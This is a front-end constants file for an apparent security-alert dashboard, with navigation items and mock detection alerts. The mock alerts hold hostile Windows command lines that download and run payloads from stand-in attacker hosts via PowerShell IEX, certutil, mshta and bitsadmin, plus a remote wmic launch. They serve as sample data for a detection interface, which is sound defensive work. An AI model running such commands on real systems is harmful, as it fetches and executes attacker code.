import React from 'react';
import {
  LayoutDashboard,
  Server,
  Users,
  ShieldAlert,
  ClipboardList,
  FileText,
  AlertTriangle,
  Briefcase,
  Search,
  User
} from 'lucide-react';

export const COLORS = {
  bg: 'bg-gray-900',
  panel: 'bg-gray-800',
  border: 'border-gray-700',
  text: 'text-white',
  subtext: 'text-gray-400',
  accent: 'emerald-500',
};

// Manager
export const MANAGER_NAV_ITEMS = [
  { id: 'overview',  label: 'Overview',        path: '/overview', icon: <LayoutDashboard size={20} strokeWidth={1.5} /> },
  { id: 'hosts',     label: 'Hosts',           path: '/hosts',    icon: <Server size={20} strokeWidth={1.5} /> },
  { id: 'users',     label: 'Users',           path: '/users',    icon: <Users size={20} strokeWidth={1.5} /> },
  { id: 'rules',     label: 'Detection Rules', path: '/rules',    icon: <ShieldAlert size={20} strokeWidth={1.5} /> },
  { id: 'audit',     label: 'Audit Log',       path: '/audit',    icon: <ClipboardList size={20} strokeWidth={1.5} /> },
  { id: 'reports',   label: 'Reports',         path: '/reports',  icon: <FileText size={20} strokeWidth={1.5} /> },
  { id: 'profile',   label: 'Profile',         path: '/profile',  icon: <User size={20} strokeWidth={1.5} /> },
];

// Analyst
export const ANALYST_NAV_ITEMS = [
  { id: 'overview',  label: 'Overview',      path: '/overview', icon: <LayoutDashboard size={20} strokeWidth={1.5} /> },
  { id: 'alerts',    label: 'Alerts',        path: '/alerts',   icon: <AlertTriangle size={20} strokeWidth={1.5} /> },
  { id: 'cases',     label: 'Cases',         path: '/cases',    icon: <Briefcase size={20} strokeWidth={1.5} /> },
  { id: 'explorer',  label: 'Log Explorer',  path: '/explorer', icon: <Search size={20} strokeWidth={1.5} /> },
  { id: 'profile',   label: 'Profile',       path: '/profile',  icon: <User size={20} strokeWidth={1.5} /> },
];

export const MOCK_ALERTS: any[] = [
  {
    id: 'AL-9281',
    timestamp: '14:22:10',
    hostname: 'FIN-SRV-01',
    severity: 'CRITICAL',
    ruleTriggered: 'PowerShell Download Cradle',
    confidence: 95,
    commandLine: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -c (New-Object Net.WebClient).DownloadString("http://c2.example.com/run.ps1") | IEX',
    processId: 4412,
    parentProcessId: 1024,
    processName: 'powershell.exe',
    status: 'new'
  },
  {
    id: 'AL-9282',
    timestamp: '14:35:45',
    hostname: 'DEV-WKST-04',
    severity: 'HIGH',
    ruleTriggered: 'CertUtil File Download',
    confidence: 88,
    commandLine: 'certutil.exe -urlcache -split -f http://malware.example.com/payload.exe C:\\Windows\\Temp\\svc.exe',
    processId: 8820,
    parentProcessId: 650,
    processName: 'certutil.exe',
    status: 'open'
  },
  {
    id: 'AL-9283',
    timestamp: '14:51:02',
    hostname: 'FIN-SRV-01',
    severity: 'MEDIUM',
    ruleTriggered: 'MSHTA Remote Execution',
    confidence: 92,
    commandLine: 'mshta.exe http://attacker.example.com/payload.hta',
    processId: 3310,
    parentProcessId: 1240,
    processName: 'mshta.exe',
    status: 'new'
  },
  {
    id: 'AL-9284',
    timestamp: '15:04:18',
    hostname: 'DEV-WKST-04',
    severity: 'LOW',
    ruleTriggered: 'WMIC Process Creation',
    confidence: 80,
    commandLine: 'wmic /node:"192.168.1.20" process call create "C:\\Windows\\Temp\\svc.exe"',
    processId: 9920,
    parentProcessId: 880,
    processName: 'wmic.exe',
    status: 'new'
  },
  {
    id: 'AL-9285',
    timestamp: '15:18:44',
    hostname: 'FIN-SRV-01',
    severity: 'HIGH',
    ruleTriggered: 'BITSAdmin File Transfer',
    confidence: 78,
    commandLine: 'bitsadmin /transfer myJob /download /priority HIGH http://c2.example.com/stage2.exe C:\\Users\\Public\\stage2.exe',
    processId: 5512,
    parentProcessId: 440,
    processName: 'bitsadmin.exe',
    status: 'new'
  }
];
